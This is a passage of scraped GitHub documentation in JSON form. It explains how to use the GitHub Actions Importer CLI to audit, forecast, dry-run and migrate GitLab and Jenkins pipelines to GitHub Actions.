          "A GitLab account or organization with pipelines and jobs that you want to convert to GitHub Actions workflows.",
          "Access to create a GitLab personal access token for your account or organization.",
          "An environment where you can run Linux-based containers, and can install the necessary tools.Docker isinstalledand running.GitHub CLIis installed.NoteThe GitHub Actions Importer container and CLI do not need to be installed on the same server as your CI platform.",
          "Docker isinstalledand running.",
          "GitHub CLIis installed."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Limitations"
      },
      {
        "type": "paragraph",
        "text": "There are some limitations on migrating processes automatically from GitLab pipelines to GitHub Actions with GitHub Actions Importer."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Automatic caching in between jobs of different workflows is not supported.",
          "Theauditcommand is only supported when using an organization account. However, thedry-runandmigratecommands can be used with an organization or user account."
        ]
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Manual tasks"
      },
      {
        "type": "paragraph",
        "text": "Certain GitLab constructs must be migrated manually. These include:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Masked project or group variable values",
          "Artifact reports"
        ]
      },
      {
        "type": "paragraph",
        "text": "For more information on manual migrations, seeMigrating from GitLab CI/CD to GitHub Actions."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Installing the GitHub Actions Importer CLI extension"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Install the GitHub Actions Importer CLI extension:Bashgh extension install github/gh-actions-importergh extension install github/gh-actions-importer",
          "Verify that the extension is installed:$ gh actions-importer -h\nOptions:\n  -?, -h, --helpShowhelpand usage information\n\nCommands:\n  update     Update to the latest version of GitHub Actions Importer.\n  version    Display the version of GitHub Actions Importer.\n  configure  Start an interactive prompt to configure credentials used to authenticate with your CI server(s).\n  audit      Plan your CI/CD migration by analyzing your current CI/CD footprint.\n  forecast   Forecast GitHub Actions usage from historical pipeline utilization.\n  dry-run    Convert a pipeline to a GitHub Actions workflow and output its yaml file.\n  migrate    Convert a pipeline to a GitHub Actions workflow and open a pull request with the changes."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Configuring credentials"
      },
      {
        "type": "paragraph",
        "text": "TheconfigureCLI command is used to set required credentials and options for GitHub Actions Importer when working with GitLab and GitHub."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Create a GitHub personal access token (classic). For more information, seeManaging your personal access tokens.Your token must have theworkflowscope.After creating the token, copy it and save it in a safe location for later use.",
          "Create a GitLab personal access token. For more information, seePersonal access tokensin the GitLab documentation.Your token must have theread_apiscope.After creating the token, copy it and save it in a safe location for later use.",
          "In your terminal, run the GitHub Actions ImporterconfigureCLI command:gh actions-importer configureTheconfigurecommand will prompt you for the following information:For \"Which CI providers are you configuring?\", use the arrow keys to selectGitLab, pressSpaceto select it, then pressEnter.For \"Personal access token for GitHub\", enter the value of the personal access token (classic) that you created earlier, and pressEnter.For \"Base url of the GitHub instance\", pressEnterto accept the default value (https://github.com).For \"Private token for GitLab\", enter the value for the GitLab personal access token that you created earlier, and pressEnter.For \"Base url of the GitLab instance\", enter the URL of your GitLab instance, and pressEnter.An example of the output of theconfigurecommand is shown below.$gh actions-importer configure✔ Which CI providers are you configuring?: GitLab\nEnter the following values (leave empty to omit):\n✔ Personal access token for GitHub: ***************\n✔ Base url of the GitHub instance: https://github.com\n✔ Private token for GitLab: ***************\n✔ Base url of the GitLab instance: http://localhost\nEnvironment variables successfully updated.",
          "For \"Which CI providers are you configuring?\", use the arrow keys to selectGitLab, pressSpaceto select it, then pressEnter.",
          "For \"Personal access token for GitHub\", enter the value of the personal access token (classic) that you created earlier, and pressEnter.",
          "For \"Base url of the GitHub instance\", pressEnterto accept the default value (https://github.com).",
          "For \"Private token for GitLab\", enter the value for the GitLab personal access token that you created earlier, and pressEnter.",
          "For \"Base url of the GitLab instance\", enter the URL of your GitLab instance, and pressEnter.",
          "In your terminal, run the GitHub Actions ImporterupdateCLI command to connect to GitHub Packages Container registry and ensure that the container image is updated to the latest version:gh actions-importer updateThe output of the command should be similar to below:Updating ghcr.io/actions-importer/cli:latest...\nghcr.io/actions-importer/cli:latest up-to-date"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Perform an audit of GitLab"
      },
      {
        "type": "paragraph",
        "text": "You can use theauditcommand to get a high-level view of all pipelines in a GitLab server."
      },
      {
        "type": "paragraph",
        "text": "Theauditcommand performs the following steps:"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Fetches all of the projects defined in a GitLab server.",
          "Converts each pipeline to its equivalent GitHub Actions workflow.",
          "Generates a report that summarizes how complete and complex of a migration is possible with GitHub Actions Importer."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Prerequisites for the audit command"
      },
      {
        "type": "paragraph",
        "text": "In order to use theauditcommand, you must have a personal access token configured with a GitLab organization account."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Running the audit command"
      },
      {
        "type": "paragraph",
        "text": "To perform an audit of a GitLab server, run the following command in your terminal, replacingmy-gitlab-namespacewith the namespace or group you are auditing:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer audit gitlab --output-dir tmp/audit --namespace my-gitlab-namespace"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Inspecting the audit results"
      },
      {
        "type": "paragraph",
        "text": "The files in the specified output directory contain the results of the audit. See theaudit_summary.mdfile for a summary of the audit results."
      },
      {
        "type": "paragraph",
        "text": "The audit summary has the following sections."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Pipelines"
      },
      {
        "type": "paragraph",
        "text": "The \"Pipelines\" section contains a high-level statistics regarding the conversion rate done by GitHub Actions Importer."
      },
      {
        "type": "paragraph",
        "text": "Listed below are some key terms that can appear in the \"Pipelines\" section:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Successfulpipelines had 100% of the pipeline constructs and individual items converted automatically to their GitHub Actions equivalent.",
          "Partially successfulpipelines had all of the pipeline constructs converted, however, there were some individual items that were not converted automatically to their GitHub Actions equivalent.",
          "Unsupportedpipelines are definition types that are not supported by GitHub Actions Importer.",
          "Failedpipelines encountered a fatal error when being converted. This can occur for one of three reasons:The pipeline was originally misconfigured and not valid.GitHub Actions Importer encountered an internal error when converting it.There was an unsuccessful network response that caused the pipeline to be inaccessible, which is often due to invalid credentials.",
          "The pipeline was originally misconfigured and not valid.",
          "GitHub Actions Importer encountered an internal error when converting it.",
          "There was an unsuccessful network response that caused the pipeline to be inaccessible, which is often due to invalid credentials."
        ]
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Build steps"
      },
      {
        "type": "paragraph",
        "text": "The \"Build steps\" section contains an overview of individual build steps that are used across all pipelines, and how many were automatically converted by GitHub Actions Importer."
      },
      {
        "type": "paragraph",
        "text": "Listed below are some key terms that can appear in the \"Build steps\" section:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Aknownbuild step is a step that was automatically converted to an equivalent action.",
          "Anunknownbuild step is a step that was not automatically converted to an equivalent action.",
          "Anunsupportedbuild step is a step that is either:Fundamentally not supported by GitHub Actions.Configured in a way that is incompatible with GitHub Actions.",
          "Fundamentally not supported by GitHub Actions.",
          "Configured in a way that is incompatible with GitHub Actions.",
          "Anactionis a list of the actions that were used in the converted workflows. This can be important for:If you use GitHub Enterprise Server, gathering the list of actions to sync to your instance.Defining an organization-level allowlist of actions that are used. This list of actions is a comprehensive list of actions that your security or compliance teams may need to review.",
          "If you use GitHub Enterprise Server, gathering the list of actions to sync to your instance.",
          "Defining an organization-level allowlist of actions that are used. This list of actions is a comprehensive list of actions that your security or compliance teams may need to review."
        ]
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Manual tasks"
      },
      {
        "type": "paragraph",
        "text": "The \"Manual tasks\" section contains an overview of tasks that GitHub Actions Importer is not able to complete automatically, and that you must complete manually."
      },
      {
        "type": "paragraph",
        "text": "Listed below are some key terms that can appear in the \"Manual tasks\" section:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Asecretis a repository or organization-level secret that is used in the converted pipelines. These secrets must be created manually in GitHub Actions for these pipelines to function properly. For more information, seeUsing secrets in GitHub Actions.",
          "Aself-hosted runnerrefers to a label of a runner that is referenced in a converted pipeline that is not a GitHub-hosted runner. You will need to manually define these runners for these pipelines to function properly."
        ]
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Files"
      },
      {
        "type": "paragraph",
        "text": "The final section of the audit report provides a manifest of all the files that were written to disk during the audit."
      },
      {
        "type": "paragraph",
        "text": "Each pipeline file has a variety of files included in the audit, including:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "The original pipeline as it was defined in GitHub.",
          "Any network responses used to convert the pipeline.",
          "The converted workflow file.",
          "Stack traces that can be used to troubleshoot a failed pipeline conversion."
        ]
      },
      {
        "type": "paragraph",
        "text": "Additionally, theworkflow_usage.csvfile contains a comma-separated list of all actions, secrets, and runners that are used by each successfully converted pipeline. This can be useful for determining which workflows use which actions, secrets, or runners, and can be useful for performing security reviews."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Forecast potential build runner usage"
      },
      {
        "type": "paragraph",
        "text": "You can use theforecastcommand to forecast potential GitHub Actions usage by computing metrics from completed pipeline runs in your GitLab server."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Running the forecast command"
      },
      {
        "type": "paragraph",
        "text": "To perform a forecast of potential GitHub Actions usage, run the following command in your terminal, replacingmy-gitlab-namespacewith the namespace or group you are forecasting. By default, GitHub Actions Importer includes the previous seven days in the forecast report."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer forecast gitlab --output-dir tmp/forecast --namespace my-gitlab-namespace"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Forecasting an entire namespace"
      },
      {
        "type": "paragraph",
        "text": "To forecast an entire namespace and all of its subgroups, you must specify each subgroup in the--namespaceargument orNAMESPACEenvironment variable."
      },
      {
        "type": "paragraph",
        "text": "For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer forecast gitlab --namespace my-gitlab-namespace my-gitlab-namespace/subgroup-one my-gitlab-namespace/subgroup-two ..."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Inspecting the forecast report"
      },
      {
        "type": "paragraph",
        "text": "Theforecast_report.mdfile in the specified output directory contains the results of the forecast."
      },
      {
        "type": "paragraph",
        "text": "Listed below are some key terms that can appear in the forecast report:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Thejob countis the total number of completed jobs.",
          "Thepipeline countis the number of unique pipelines used.",
          "Execution timedescribes the amount of time a runner spent on a job. This metric can be used to help plan for the cost of GitHub-hosted runners.This metric is correlated to how much you should expect to spend in GitHub Actions. This will vary depending on the hardware used for these minutes. You can use theGitHub Actions pricing calculatorto estimate the costs.",
          "This metric is correlated to how much you should expect to spend in GitHub Actions. This will vary depending on the hardware used for these minutes. You can use theGitHub Actions pricing calculatorto estimate the costs.",
          "Queue timemetrics describe the amount of time a job spent waiting for a runner to be available to execute it.",
          "Concurrent jobsmetrics describe the amount of jobs running at any given time. This metric can be used to define the number of runners you should configure."
        ]
      },
      {
        "type": "paragraph",
        "text": "Additionally, these metrics are defined for each queue of runners in GitLab. This is especially useful if there is a mix of hosted or self-hosted runners, or high or low spec machines, so you can see metrics specific to different types of runners."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Perform a dry-run migration of a GitLab pipeline"
      },
      {
        "type": "paragraph",
        "text": "You can use thedry-runcommand to convert a GitLab pipeline to its equivalent GitHub Actions workflow."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Running the dry-run command"
      },
      {
        "type": "paragraph",
        "text": "You can use thedry-runcommand to convert a GitLab pipeline to an equivalent GitHub Actions workflow. A dry-run creates the output files in a specified directory, but does not open a pull request to migrate the pipeline."
      },
      {
        "type": "paragraph",
        "text": "To perform a dry run of migrating your GitLab pipelines to GitHub Actions, run the following command in your terminal, replacingmy-gitlab-projectwith your GitLab project slug, andmy-gitlab-namespacewith the namespace or group (full group path for subgroups, e.g.my-org/my-team) you are performing a dry run for."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer dry-run gitlab --output-dir tmp/dry-run --namespace my-gitlab-namespace --project my-gitlab-project"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Inspecting the converted workflows"
      },
      {
        "type": "paragraph",
        "text": "You can view the logs of the dry run and the converted workflow files in the specified output directory."
      },
      {
        "type": "paragraph",
        "text": "If there is anything that GitHub Actions Importer was not able to convert automatically, such as unknown build steps or a partially successful pipeline, you might want to create custom transformers to further customize the conversion process. For more information, seeExtending GitHub Actions Importer with custom transformers."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Perform a production migration of a GitLab pipeline"
      },
      {
        "type": "paragraph",
        "text": "You can use themigratecommand to convert a GitLab pipeline and open a pull request with the equivalent GitHub Actions workflow."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Running the migrate command"
      },
      {
        "type": "paragraph",
        "text": "To migrate a GitLab pipeline to GitHub Actions, run the following command in your terminal, replacing the following values:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "target-urlvalue with the URL for your GitHub repository",
          "my-gitlab-projectwith your GitLab project slug",
          "my-gitlab-namespacewith the namespace or group you are migrating (full path for subgroups, e.g.my-org/my-team)"
        ]
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer migrate gitlab --target-url https://github.com/:owner/:repo --output-dir tmp/migrate --namespace my-gitlab-namespace --project my-gitlab-project"
      },
      {
        "type": "paragraph",
        "text": "The command's output includes the URL to the pull request that adds the converted workflow to your repository. An example of a successful output is similar to the following:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "$ gh actions-importer migrate gitlab --target-url https://github.com/octo-org/octo-repo --output-dir tmp/migrate --namespace octo-org --project monas-project\n[2022-08-20 22:08:20] Logs: 'tmp/migrate/log/actions-importer-20220916-014033.log'\n[2022-08-20 22:08:20] Pull request: 'https://github.com/octo-org/octo-repo/pull/1'"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Inspecting the pull request"
      },
      {
        "type": "paragraph",
        "text": "The output from a successful run of themigratecommand contains a link to the new pull request that adds the converted workflow to your repository."
      },
      {
        "type": "paragraph",
        "text": "Some important elements of the pull request include:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "In the pull request description, a section calledManual steps, which lists steps that you must manually complete before you can finish migrating your pipelines to GitHub Actions. For example, this section might tell you to create any secrets used in your workflows.",
          "The converted workflows file. Select theFiles changedtab in the pull request to view the workflow file that will be added to your GitHub repository."
        ]
      },
      {
        "type": "paragraph",
        "text": "When you are finished inspecting the pull request, you can merge it to add the workflow to your GitHub repository."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Reference"
      },
      {
        "type": "paragraph",
        "text": "This section contains reference information on environment variables, optional arguments, and supported syntax when using GitHub Actions Importer to migrate from GitLab."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using environment variables"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions Importer uses environment variables for its authentication configuration. These variables are set when following the configuration process using theconfigurecommand. For more information, see theConfiguring credentialssection."
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions Importer uses the following environment variables to connect to your GitLab instance:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "GITHUB_ACCESS_TOKEN: The personal access token (classic) used to create pull requests with a converted workflow (requires theworkflowscope).",
          "GITHUB_INSTANCE_URL: The URL to the target GitHub instance (for example,https://github.com).",
          "GITLAB_ACCESS_TOKEN: The GitLab personal access token used to view GitLab resources.",
          "GITLAB_INSTANCE_URL: The URL of the GitLab instance.",
          "NAMESPACE: The namespaces or groups that contain the GitLab pipelines."
        ]
      },
      {
        "type": "paragraph",
        "text": "These environment variables can be specified in a.env.localfile that is loaded by GitHub Actions Importer when it is run."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using optional arguments"
      },
      {
        "type": "paragraph",
        "text": "There are optional arguments you can use with the GitHub Actions Importer subcommands to customize your migration."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "--source-file-path"
      },
      {
        "type": "paragraph",
        "text": "You can use the--source-file-pathargument with theforecast,dry-run, ormigratesubcommands."
      },
      {
        "type": "paragraph",
        "text": "By default, GitHub Actions Importer fetches pipeline contents from source control. The--source-file-pathargument tells GitHub Actions Importer to use the specified source file path instead."
      },
      {
        "type": "paragraph",
        "text": "For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer dry-run gitlab --output-dir output/ --namespace my-gitlab-namespace --project my-gitlab-project --source-file-path path/to/.gitlab-ci.yml"
      },
      {
        "type": "paragraph",
        "text": "If you would like to supply multiple source files when running theforecastsubcommand, you can use pattern matching in the file path value. The following example supplies GitHub Actions Importer with any source files that match the./tmp/previous_forecast/jobs/*.jsonfile path."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer forecast gitlab --output-dir output/ --namespace my-gitlab-namespace --project my-gitlab-project --source-file-path ./tmp/previous_forecast/jobs/*.json"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "--config-file-path"
      },
      {
        "type": "paragraph",
        "text": "You can use the--config-file-pathargument with theaudit,dry-run, andmigratesubcommands."
      },
      {
        "type": "paragraph",
        "text": "By default, GitHub Actions Importer fetches pipeline contents from source control. The--config-file-pathargument tells GitHub Actions Importer to use the specified source files instead."
      },
      {
        "type": "paragraph",
        "text": "The--config-file-pathargument can also be used to specify which repository a converted reusable workflow should be migrated to."
      },
      {
        "type": "heading",
        "level": 5,
        "text": "Audit example"
      },
      {
        "type": "paragraph",
        "text": "In this example, GitHub Actions Importer uses the specified YAML configuration file to perform an audit."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer audit gitlab --output-dir path/to/output/ --namespace my-gitlab-namespace --config-file-path path/to/gitlab/config.yml"
      },
      {
        "type": "paragraph",
        "text": "To audit a GitLab instance using a configuration file, the file must be in the following format, and eachrepository_slugvalue must be unique:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "source_files:\n  - repository_slug: namespace/project-name\n    path: path/to/.gitlab-ci.yml\n  - repository_slug: namespace/some-other-project-name\n    path: path/to/.gitlab-ci.yml"
      },
      {
        "type": "heading",
        "level": 5,
        "text": "Dry run example"
      },
      {
        "type": "paragraph",
        "text": "In this example, GitHub Actions Importer uses the specified YAML configuration file as the source file to perform a dry run."
      },
      {
        "type": "paragraph",
        "text": "The pipeline is selected by matching therepository_slugin the configuration file to the value of the--namespaceand--projectoptions. Thepathis then used to pull the specified source file."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer dry-run gitlab --namespace my-gitlab-namespace --project my-gitlab-project-name --output-dir ./output/ --config-file-path ./path/to/gitlab/config.yml"
      },
      {
        "type": "heading",
        "level": 5,
        "text": "Specify the repository of converted reusable workflows"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions Importer uses the YAML file provided to the--config-file-pathargument to determine the repository that converted reusable workflows are migrated to."
      },
      {
        "type": "paragraph",
        "text": "To begin, you should run an audit without the--config-file-pathargument:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer audit gitlab --output-dir ./output/"
      },
      {
        "type": "paragraph",
        "text": "The output of this command will contain a file namedconfig.ymlthat contains a list of all the composite actions that were converted by GitHub Actions Importer. For example, theconfig.ymlfile may have the following contents:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "reusable_workflows:\n  - name: my-reusable-workflow.yml\n    target_url: https://github.com/octo-org/octo-repo\n    ref: main"
      },
      {
        "type": "paragraph",
        "text": "You can use this file to specify which repository and ref a reusable workflow or composite action should be added to. You can then use the--config-file-pathargument to provide theconfig.ymlfile to GitHub Actions Importer. For example, you can use this file when running amigratecommand to open a pull request for each unique repository defined in the config file:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer migrate gitlab --project my-project-name --output-dir output/ --config-file-path config.yml --target-url https://github.com/my-org/my-repo"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Supported syntax for GitLab pipelines"
      },
      {
        "type": "paragraph",
        "text": "The following table shows the type of properties GitHub Actions Importer is currently able to convert. For more details about how GitLab pipeline syntax aligns with GitHub Actions, seeMigrating from GitLab CI/CD to GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "For information about supported GitLab constructs, see thegithub/gh-actions-importerrepository."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Environment variables syntax"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions Importer uses the mapping in the table below to convert default GitLab environment variables to the closest equivalent in GitHub Actions."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Legal notice"
      },
      {
        "type": "paragraph",
        "text": "Portions have been adapted fromhttps://github.com/github/gh-actions-importer/under the MIT license:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "MIT License\n\nCopyright (c) 2022 GitHub\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-jenkins-with-github-actions-importer",
    "content": [
      {
        "type": "paragraph",
        "text": "Legal notice"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "About migrating from Jenkins with GitHub Actions Importer"
      },
      {
        "type": "paragraph",
        "text": "The instructions below will guide you through configuring your environment to use GitHub Actions Importer to migrate Jenkins pipelines to GitHub Actions."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Prerequisites"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "A Jenkins account or organization with pipelines and jobs that you want to convert to GitHub Actions workflows.",
          "Access to create a Jenkins personal API token for your account or organization.",
          "An environment where you can run Linux-based containers, and can install the necessary tools.Docker isinstalledand running.GitHub CLIis installed.NoteThe GitHub Actions Importer container and CLI do not need to be installed on the same server as your CI platform.",
          "Docker isinstalledand running.",
          "GitHub CLIis installed."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Limitations"
      },
      {
        "type": "paragraph",
        "text": "There are some limitations when migrating from Jenkins to GitHub Actions with GitHub Actions Importer. For example, you must migrate the following constructs manually:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Mandatory build tools",
          "Scripted pipelines",
          "Secrets",
          "Self-hosted runners",
          "Unknown plugins"
        ]
      },
      {
        "type": "paragraph",
        "text": "For more information on manual migrations, seeMigrating from Jenkins to GitHub Actions."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Installing the GitHub Actions Importer CLI extension"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Install the GitHub Actions Importer CLI extension:Bashgh extension install github/gh-actions-importergh extension install github/gh-actions-importer",
          "Verify that the extension is installed:$ gh actions-importer -h\nOptions:\n  -?, -h, --helpShowhelpand usage information\n\nCommands:\n  update     Update to the latest version of GitHub Actions Importer.\n  version    Display the version of GitHub Actions Importer.\n  configure  Start an interactive prompt to configure credentials used to authenticate with your CI server(s).\n  audit      Plan your CI/CD migration by analyzing your current CI/CD footprint.\n  forecast   Forecast GitHub Actions usage from historical pipeline utilization.\n  dry-run    Convert a pipeline to a GitHub Actions workflow and output its yaml file.\n  migrate    Convert a pipeline to a GitHub Actions workflow and open a pull request with the changes."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Configuring credentials"
      },
      {
        "type": "paragraph",
        "text": "TheconfigureCLI command is used to set required credentials and options for GitHub Actions Importer when working with Jenkins and GitHub."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Create a GitHub personal access token (classic). For more information, seeManaging your personal access tokens.Your token must have theworkflowscope.After creating the token, copy it and save it in a safe location for later use.",
          "Create a Jenkins API token. For more information, seeAuthenticating scripted clientsin the Jenkins documentation.After creating the token, copy it and save it in a safe location for later use.",
          "In your terminal, run the GitHub Actions ImporterconfigureCLI command:gh actions-importer configureTheconfigurecommand will prompt you for the following information:For \"Which CI providers are you configuring?\", use the arrow keys to selectJenkins, pressSpaceto select it, then pressEnter.For \"Personal access token for GitHub\", enter the value of the personal access token (classic) that you created earlier, and pressEnter.For \"Base url of the GitHub instance\", pressEnterto accept the default value (https://github.com).For \"Personal access token for Jenkins\", enter the value for the Jenkins personal API token that you created earlier, and pressEnter.For \"Username of Jenkins user\", enter your Jenkins username and pressEnter.For \"Base url of the Jenkins instance\", enter the URL of your Jenkins instance, and pressEnter.An example of theconfigurecommand is shown below:$gh actions-importer configure✔ Which CI providers are you configuring?: Jenkins\nEnter the following values (leave empty to omit):\n✔ Personal access token for GitHub: ***************\n✔ Base url of the GitHub instance: https://github.com\n✔ Personal access token for Jenkins: ***************\n✔ Username of Jenkins user: admin\n✔ Base url of the Jenkins instance: https://localhost\nEnvironment variables successfully updated.",
          "For \"Which CI providers are you configuring?\", use the arrow keys to selectJenkins, pressSpaceto select it, then pressEnter.",
          "For \"Personal access token for GitHub\", enter the value of the personal access token (classic) that you created earlier, and pressEnter.",
          "For \"Base url of the GitHub instance\", pressEnterto accept the default value (https://github.com).",
          "For \"Personal access token for Jenkins\", enter the value for the Jenkins personal API token that you created earlier, and pressEnter.",
          "For \"Username of Jenkins user\", enter your Jenkins username and pressEnter.",
          "For \"Base url of the Jenkins instance\", enter the URL of your Jenkins instance, and pressEnter.",
          "In your terminal, run the GitHub Actions ImporterupdateCLI command to connect to GitHub Packages Container registry and ensure that the container image is updated to the latest version:gh actions-importer updateThe output of the command should be similar to below:Updating ghcr.io/actions-importer/cli:latest...\nghcr.io/actions-importer/cli:latest up-to-date"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Perform an audit of Jenkins"
      },
      {
        "type": "paragraph",
        "text": "You can use theauditcommand to get a high-level view of all pipelines in a Jenkins server."
      },
      {
        "type": "paragraph",
        "text": "Theauditcommand performs the following steps:"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Fetches all of the projects defined in a Jenkins server.",
          "Converts each pipeline to its equivalent GitHub Actions workflow.",
          "Generates a report that summarizes how complete and complex of a migration is possible with GitHub Actions Importer."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Running the audit command"
      },
      {
        "type": "paragraph",
        "text": "To perform an audit of a Jenkins server, run the following command in your terminal:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer audit jenkins --output-dir tmp/audit"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Inspecting the audit results"
      },
      {
        "type": "paragraph",
        "text": "The files in the specified output directory contain the results of the audit. See theaudit_summary.mdfile for a summary of the audit results."
      },
      {
        "type": "paragraph",
        "text": "The audit summary has the following sections."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Pipelines"
      },
      {
        "type": "paragraph",
        "text": "The \"Pipelines\" section contains a high-level statistics regarding the conversion rate done by GitHub Actions Importer."
      },
      {
        "type": "paragraph",
        "text": "Listed below are some key terms that can appear in the \"Pipelines\" section:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Successfulpipelines had 100% of the pipeline constructs and individual items converted automatically to their GitHub Actions equivalent.",
          "Partially successfulpipelines had all of the pipeline constructs converted, however, there were some individual items that were not converted automatically to their GitHub Actions equivalent.",
          "Unsupportedpipelines are definition types that are not supported by GitHub Actions Importer.",
          "Failedpipelines encountered a fatal error when being converted. This can occur for one of three reasons:The pipeline was originally misconfigured and not valid.GitHub Actions Importer encountered an internal error when converting it.There was an unsuccessful network response that caused the pipeline to be inaccessible, which is often due to invalid credentials.",
          "The pipeline was originally misconfigured and not valid.",
          "GitHub Actions Importer encountered an internal error when converting it.",
          "There was an unsuccessful network response that caused the pipeline to be inaccessible, which is often due to invalid credentials."
        ]
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Build steps"
      },
      {
        "type": "paragraph",
        "text": "The \"Build steps\" section contains an overview of individual build steps that are used across all pipelines, and how many were automatically converted by GitHub Actions Importer."
      },
      {
        "type": "paragraph",
        "text": "Listed below are some key terms that can appear in the \"Build steps\" section:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Aknownbuild step is a step that was automatically converted to an equivalent action.",
          "Anunknownbuild step is a step that was not automatically converted to an equivalent action.",
          "Anunsupportedbuild step is a step that is either:Fundamentally not supported by GitHub Actions.Configured in a way that is incompatible with GitHub Actions.",
          "Fundamentally not supported by GitHub Actions.",
          "Configured in a way that is incompatible with GitHub Actions.",
          "Anactionis a list of the actions that were used in the converted workflows. This can be important for:If you use GitHub Enterprise Server, gathering the list of actions to sync to your instance.Defining an organization-level allowlist of actions that are used. This list of actions is a comprehensive list of actions that your security or compliance teams may need to review.",
          "If you use GitHub Enterprise Server, gathering the list of actions to sync to your instance.",
          "Defining an organization-level allowlist of actions that are used. This list of actions is a comprehensive list of actions that your security or compliance teams may need to review."
        ]
      },
      {
        "type": "heading",
        "level": 4,
